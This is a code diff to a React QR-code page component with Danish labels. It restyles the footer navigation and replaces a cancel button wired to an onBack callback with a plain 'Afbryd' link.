@@ -134,10 +134,9 @@ export default function QRPage({ sessionId, onBack }: Props) {
                 </div>
                 <div className="flex-1" />
                 <hr className="border-gray-200 mb-3" />
-                <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
-                  <button onClick={onBack} className="hover:underline cursor-pointer">Annuller</button>
-                  <a href="#" className="hover:underline">Hjælp</a>
-                </nav>
+                <nav className="flex items-center gap-8 text-[15px] font-bold text-[#333]">
+                <a href="#" className="hover:underline">Afbryd</a><a href="#" className="hover:underline">Hjælp</a>
+              </nav>
               </div>
             </CardShell>
             <SidePanel />
@@ -226,9 +225,8 @@ export default function QRPage({ sessionId, onBack }: Props) {
               </div>
               <div className="flex-1" />
               <hr className="border-gray-200 mb-3" />
-              <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
-                <button onClick={onBack} className="hover:underline cursor-pointer">Annuller</button>
-                <a href="#" className="hover:underline">Hjælp</a>
+              <nav className="flex items-center gap-8 text-[15px] font-bold text-[#333]">
+                <a href="#" className="hover:underline">Afbryd</a><a href="#" className="hover:underline">Hjælp</a>
               </nav>
             </div>
           </CardShell>
